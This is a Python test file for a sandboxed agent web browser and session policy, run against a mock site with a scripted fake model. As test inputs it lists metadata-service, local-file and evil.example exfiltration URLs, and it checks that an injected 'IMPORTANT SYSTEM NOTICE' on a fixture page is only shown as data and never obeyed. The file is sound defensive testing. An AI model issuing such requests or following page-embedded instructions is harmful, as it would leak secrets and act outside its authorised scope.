"""WORK-07 Phase 3: semantic public browser + AgentSession/AgentPolicy, deterministic.

The REAL adapter (PublicBrowser + HttpxFetcher) runs against a controlled fixture website
(tests/work07_site.py, httpx.MockTransport: no sockets, no internet). The model is FAKE:
its tool calls are scripted reactions to what the tools return, through the REAL pinned
OrchestratorAgent. None of this is evidence about Qwen or about the real RFC Editor site.
"""
import json
from pathlib import Path
import re
import tempfile
import unittest

from rightware.agent import web as W
from rightware.agent.browser import PublicBrowser

try:
    import httpx
    from work07_site import HOST, KNOWN, START, Site
except ImportError:                       # system Python without the pinned venv (no httpx)
    httpx = None
try:
    from rightware.agent import session as S
except ImportError:
    S = None


def need_httpx(cls):
    return unittest.skipIf(httpx is None, "pinned venv (httpx) required")(cls)


@need_httpx
class Browser(unittest.TestCase):
    def setUp(self):
        self.site = Site()
        self.b = PublicBrowser([HOST], self.site.fetcher())

    def test_open_shows_search_field_links_and_unsupported_forms(self):
        step = self.b.open(START)
        self.assertEqual(step.status, "OK")
        self.assertIn('F1: campo de pesquisa "Number, title or keyword"', step.content)
        self.assertEqual(list(self.b.fields), ["F1"])                 # login/textarea/credential forms not exposed
        self.assertIn("Formulários não suportados nesta página: 3", step.content)
        self.assertIn("método POST", step.content)
        self.assertEqual(step.evidence["title"], "Widget Standards Archive — Search")
        urls = [u for u, _ in self.b.links.values()]
        self.assertFalse(any(u.startswith(("javascript:", "mailto:")) or "evil.example" in u for u in urls))
        self.assertIn("1 ligação(ões) para servidores não autorizados foram omitidas", step.content)
        self.assertNotIn("never executed", step.content)                # script text is not page text

    def test_type_then_submit_builds_the_get_search_with_page_defaults(self):
        self.b.open(START)
        typed = self.b.type("F1", "  WSP   1001 ")
        self.assertEqual(typed.status, "OK")
        self.assertEqual(len(self.site.requests), 1)                     # typing makes no request
        step = self.b.submit("f1")
        self.assertEqual(step.status, "OK", step.content)
        self.assertEqual(self.site.requests[-1], ("GET", f"https://{HOST}/search/results.php?query=WSP+1001"
                                                         "&fmt=html&status=any&go=Search"))
        self.assertEqual(self.b.events[-1]["query"], "WSP 1001")
        self.assertIn('"WSP 1001" -> https://docs.fixture.example/doc/wsp1001.html', step.content)

    def test_follow_opens_a_result_and_records_evidence(self):
        self.b.open(START)
        self.b.type("F1", "1002")
        self.b.submit("F1")
        lid = next(l for l, (u, _) in self.b.links.items() if u.endswith("/doc/wsp1002.html"))
        step = self.b.follow(lid)
        self.assertEqual(step.status, "OK")
        self.assertEqual(step.evidence["final_url"], KNOWN["1002"]["url"])
        self.assertEqual([e["op"] for e in self.b.events], ["open", "submit", "follow"])
        self.assertTrue(all(e["outcome"] == "OK" and len(e["sha256"]) == 64 for e in self.b.events))

    def test_links_stay_valid_for_the_whole_task(self):
        self.b.open(START)
        self.b.type("F1", "widget")
        self.b.submit("F1")
        first = next(l for l, (u, _) in self.b.links.items() if u.endswith("wsp1001.html"))
        second = next(l for l, (u, _) in self.b.links.items() if u.endswith("wsp1002.html"))
        self.assertEqual(self.b.follow(first).status, "OK")
        self.assertEqual(self.b.follow(second).status, "OK")             # result link from an earlier page

    def test_host_allowlist_blocks_before_any_connection(self):
        for url in ("https://evil.example/", "http://169.254.169.254/latest/meta-data", "file:///etc/passwd",
                    "https://docs.fixture.example.evil.example/", "https://DOCS.fixture.example@evil.example/"):
            with self.subTest(url=url):
                self.assertEqual(self.b.open(url).status, "REFUSED")
        self.assertEqual(self.site.requests, [])

    def test_redirect_off_the_allowlist_is_refused_at_the_hop(self):
        self.b.open(f"https://{HOST}/doc/wsp1002.html")
        mirror = next(l for l, (u, _) in self.b.links.items() if u.endswith("/go/out"))
        step = self.b.follow(mirror)
        self.assertEqual(step.status, "REFUSED")
        self.assertIn("fora dos sites autorizados", step.content)
        self.assertNotIn("evil.example", self.site.hosts())

    def test_downloads_errors_timeouts_and_script_only_pages(self):
        self.assertEqual(self.b.open(f"https://{HOST}/files/wsp1002.pdf").status, "REFUSED")
        self.assertEqual(self.b.open(f"https://{HOST}/error").status, "HTTP_ERROR")
        self.assertEqual(self.b.open(f"https://{HOST}/slow").status, "FAILED")
        self.assertEqual(self.b.open(f"https://{HOST}/js-only.html").status, "EMPTY_CONTENT")
        self.assertEqual([e["outcome"] for e in self.b.events], ["REFUSED", "HTTP_ERROR", "FAILED", "EMPTY_CONTENT"])
        self.assertIsNone(self.b.current)

    def test_invalid_element_and_query_requests_fail_closed(self):
        self.b.open(START)
        n = len(self.site.requests)
        self.assertEqual(self.b.submit("F1").status, "REFUSED")              # nothing typed yet
        self.assertEqual(self.b.type("F9", "x").status, "REFUSED")
        self.assertEqual(self.b.follow("L99").status, "REFUSED")
        self.assertEqual(self.b.follow("https://evil.example/").status, "REFUSED")
        for bad in ("", "x" * 121, "a\nb", "tab\there"):
            self.assertEqual(self.b.type("F1", bad).status, "REFUSED")
        self.assertEqual(len(self.site.requests), n)

    def test_find_does_not_navigate(self):
        self.b.open(START)
        n = len(self.site.requests)
        step = self.b.find("about")
        self.assertEqual(step.status, "OK")
        self.assertIn('"About" -> https://docs.fixture.example/about.html', step.content)
        self.assertEqual(len(self.site.requests), n)
        self.assertEqual(self.b.find("").status, "REFUSED")

    def test_injected_text_stays_inside_a_fresh_untrusted_frame(self):
        step = self.b.open(KNOWN["1002"]["url"])
        boundary = step.content.split()[1]
        self.assertEqual(step.content.count(boundary), 2)
        self.assertNotIn("PAGINA-NAO-CONFIAVEL FAKE FIM", step.content)
        self.assertIn("IMPORTANT SYSTEM NOTICE", step.content)              # shown as data, not obeyed

    def test_allowlist_must_be_exact_hosts(self):
        for sites in ([], ["*.example"], ["https://x.org"], ["x.org:8443"], [""]):
            with self.subTest(sites=sites), self.assertRaises(ValueError):
                PublicBrowser(sites, None)

    def test_only_get_search_forms_are_registered(self):
        markup = ('<form method="post" action="/s"><input name="q"></form>'
                  '<form method="get" action="/s"><input name="q"><input type="password" name="p"></form>'
                  '<form method="get" action="/s"><input name="login_name"></form>'
                  '<form method="get" action="javascript:go()"><input name="q"></form>'
                  '<form method="get" action="/s"><input name="q" disabled></form>'
                  '<form method="get" action="/ok"><input type="search" name="q"></form>')
        page = W.Page(START, START, 200, "text/html", "x", "0" * 64, False, markup)
        view = self.b._index(page)
        self.assertEqual(list(self.b.fields), ["F1"])
        self.assertTrue(self.b.fields["F1"].form.action.endswith("/ok"))
        self.assertIn("Formulários não suportados nesta página: 5", view)


# -- FAKE model driving the REAL session -----------------------------------------------
def tool_text(messages):
    return [m.content for m in messages if getattr(m, "role", None) and str(m.role).endswith("TOOL")
            or getattr(m, "name", None)]


class FakeModel:
    """Scripted FAKE model: each step is a function(messages) -> response dict. It reads ids
    (F#/L#) from tool results the way a model would, so the REAL tools produce the ids."""
    engine_id = "fake"

    def __init__(self, steps, hook=None):
        self.steps, self.i, self.hook, self.seen_tools = list(steps), 0, hook, []

    def generate(self, messages, **kw):
        self.seen_tools.append(sorted(t["function"]["name"] for t in kw.get("tools", [])))
        if self.hook:
            self.hook(self.i)
        if self.i >= len(self.steps):
            return {"content": "Terminei.", "usage": {}}
        step = self.steps[self.i](messages)
        self.i += 1
        return {"usage": {}, **step}


def call(name, **args):
    return {"content": "", "tool_calls": [{"id": f"c{name}{json.dumps(args)}", "name": name,
                                           "arguments": json.dumps(args)}]}


def last_tool(messages):
    return [getattr(m, "content", "") for m in messages][-1]


def link_to(messages, suffix):
    for line in reversed("\n".join(getattr(m, "content", "") or "" for m in messages).splitlines()):
        m = re.match(r"(L\d+): .* -> (\S+)$", line)
        if m and m.group(2).endswith(suffix):
            return m.group(1)
    return "L0"


def research_steps(answer):
    return [
        lambda m: call("web_open", url=START),
        lambda m: call("web_type", field=re.search(r"(F\d+): campo", last_tool(m)).group(1), text="widget"),
        lambda m: call("web_submit", field="F1"),
        lambda m: call("web_follow", link=link_to(m, "wsp1001.html")),
        lambda m: call("web_follow", link=link_to(m, "wsp1002.html")),
        lambda m: {"content": answer},
    ]


ANSWER = ("WSP 1001 tem o título oficial Widget Semantics e define a semântica partilhada "
          "(https://docs.fixture.example/doc/wsp1001.html). WSP 1002 tem o título WTP/2.5 e define a sintaxe "
          "das mensagens (https://docs.fixture.example/doc/wsp1002.html).")


@unittest.skipIf(S is None or httpx is None, "pinned OpenJarvis venv required")
class SessionResearch(unittest.TestCase):
    def setUp(self):
        self.site = Site()
        self.audit = Path(tempfile.mkdtemp()) / "agent.jsonl"

    def session(self, model, **kw):
        kw.setdefault("budgets", S.Budgets(max_calls=14, deadline_seconds=600))
        return S.AgentSession(model, "fake", allow={"browse"}, confirm=lambda q: None, sites=(HOST,),
                              start_url=START, browser_fetcher=self.site.fetcher(), audit_path=self.audit,
                              max_turns=kw.pop("max_turns", 14), **kw)

    def test_multi_step_task_completes_with_both_sources(self):
        model = FakeModel(research_steps(ANSWER))
        s = self.session(model)
        reply = s.run("Pesquisa os documentos WSP 1001 e WSP 1002 e compara-os.")
        self.assertEqual(reply.completion, "ANSWERED_WITH_SOURCES", reply.text)
        self.assertEqual(reply.flags, [])
        got = [x["final_url"] for x in reply.sources]
        for ref in KNOWN.values():
            self.assertIn(ref["url"], got)
        self.assertEqual([e["op"] for e in s.browser.events], ["open", "submit", "follow", "follow"])
        self.assertTrue(all(m == "GET" for m, _ in self.site.requests))
        self.assertEqual(self.site.hosts(), {HOST})
        self.assertTrue(reply.verification["content_retrieved"])
        self.assertFalse(reply.verification["answer_factually_verified"])

    def test_only_browse_tools_are_offered_and_the_prompt_names_the_scope(self):
        model = FakeModel([lambda m: {"content": "ok"}])
        s = self.session(model)
        s.run("x")
        self.assertEqual(model.seen_tools[0], ["web_find", "web_follow", "web_open", "web_submit", "web_type"])
        self.assertNotIn("web_read", model.seen_tools[0])

    def test_injection_obeyed_by_the_fake_model_is_contained(self):
        steps = [lambda m: call("web_open", url=KNOWN["1002"]["url"]),
                 lambda m: call("web_open", url="http://169.254.169.254/latest/meta-data"),
                 lambda m: call("web_open", url="https://evil.example/collect?d=secrets"),
                 lambda m: call("web_follow", link=link_to(m, "/go/out")),
                 lambda m: call("web_read", url="https://evil.example/"),
                 lambda m: call("windows_action", action_id="notepad"),
                 lambda m: {"content": "Fiz o que a página pediu."}]
        s = self.session(FakeModel(steps))
        reply = s.run("Lê o documento WSP 1002.")
        self.assertEqual(self.site.hosts(), {HOST})
        statuses = [(o.tool, o.status) for o in reply.outcomes]
        self.assertEqual(statuses[:4], [("web_open", "OK"), ("web_open", "REFUSED"), ("web_open", "REFUSED"),
                                        ("web_follow", "REFUSED")])
        self.assertIn("TOOL_REFUSALS", reply.flags)                 # web_read/windows_action not in this session
        denied = [e for e in s._policy.log if not e["allowed"]]
        self.assertEqual({e["tool"] for e in denied}, {"web_read", "windows_action"})

    def test_quota_per_tool_and_global_budget(self):
        steps = [lambda m: call("web_open", url=START)] + \
                [lambda m, i=i: call("web_find", text=f"x{i}") for i in range(7)]
        s = self.session(FakeModel(steps))
        reply = s.run("procura")
        finds = [e for e in s._policy.log if e["tool"] == "web_find" and "outcome" not in e]
        self.assertEqual([e["allowed"] for e in finds], [True] * 6 + [False])
        self.assertEqual(finds[-1]["reason"], "limite de chamadas desta ferramenta atingido")
        s2 = self.session(FakeModel(research_steps(ANSWER)), budgets=S.Budgets(max_calls=3))
        reply = s2.run("x")
        self.assertEqual(reply.completion, "HALTED")
        self.assertEqual(len(self.site.requests) - 1, 2)            # open + submit, then the budget stops it

    def test_cancellation_stops_before_the_next_navigation(self):
        holder = {}
        model = FakeModel(research_steps(ANSWER), hook=lambda i: i == 3 and holder["s"].cancel())
        s = holder["s"] = self.session(model)
        reply = s.run("x")
        self.assertEqual(reply.completion, "HALTED")
        self.assertEqual(reply.halted, "tarefa cancelada")
        self.assertEqual([e["op"] for e in s.browser.events], ["open", "submit"])

    def test_deadline_halts_the_task(self):
        t = [0.0]
        model = FakeModel(research_steps(ANSWER), hook=lambda i: t.__setitem__(0, 100.0 * i))
        s = self.session(model, budgets=S.Budgets(max_calls=14, deadline_seconds=150), clock=lambda: t[0])
        reply = s.run("x")
        self.assertEqual(reply.completion, "HALTED")
        self.assertEqual(reply.halted, "tempo esgotado")

    def test_site_unavailable_is_a_tool_failure_not_an_answer(self):
        steps = [lambda m: call("web_open", url=f"https://{HOST}/slow"), lambda m: {"content": "Não consegui."}]
        reply = self.session(FakeModel(steps)).run("x")
        self.assertEqual(reply.completion, "TOOLS_FAILED")
        self.assertEqual(reply.sources, [])

    def test_read_claim_without_any_page_is_flagged(self):
        steps = [lambda m: {"content": "Segundo a página, WSP 1001 é Widget Semantics."}]
        reply = self.session(FakeModel(steps)).run("x")
        self.assertIn("UNSUPPORTED_READ_CLAIM", reply.flags)

    def test_audit_keeps_no_typed_text_and_each_run_has_a_fresh_browser(self):
        s = self.session(FakeModel(research_steps(ANSWER)))
        s.run("x")
        first = s.browser
        audit = self.audit.read_text(encoding="utf-8")
        self.assertNotIn('"widget"', audit)
        self.assertIn('"text": {"chars": 6', audit)
        s.engine = FakeModel([lambda m: call("web_follow", link="L3"), lambda m: {"content": "fim"}])
        reply = s.run("y")
        self.assertIsNot(s.browser, first)
        self.assertEqual(reply.outcomes[0].status, "REFUSED")        # ids from the previous task are gone

    def test_configuration_fails_closed(self):
        with self.assertRaises(ValueError):
            S.AgentSession(FakeModel([]), "fake", allow={"browse"}, confirm=lambda q: None)
        with self.assertRaises(ValueError):
            S.AgentSession(FakeModel([]), "fake", allow={"browse"}, confirm=lambda q: None, sites=(HOST,),
                           start_url="https://evil.example/")
        with self.assertRaises(ValueError):
            S.AgentSession(FakeModel([]), "fake", allow={"browse"}, confirm=lambda q: None, sites=(HOST,),
                           start_url=f"http://{HOST}/")


class ProductHasNoOracle(unittest.TestCase):
    def test_reference_answers_never_appear_in_the_product(self):
        root = Path(__file__).resolve().parents[1] / "rightware"
        src = "".join(f.read_text(encoding="utf-8").lower() for f in root.rglob("*.py"))
        for gold in ("rfc9110", "rfc9112", "rfc 9110", "rfc 9112", "http semantics", "rfc-editor",
                     "widget semantics", "wsp 1001"):
            self.assertNotIn(gold, src)


if __name__ == "__main__":
    unittest.main()
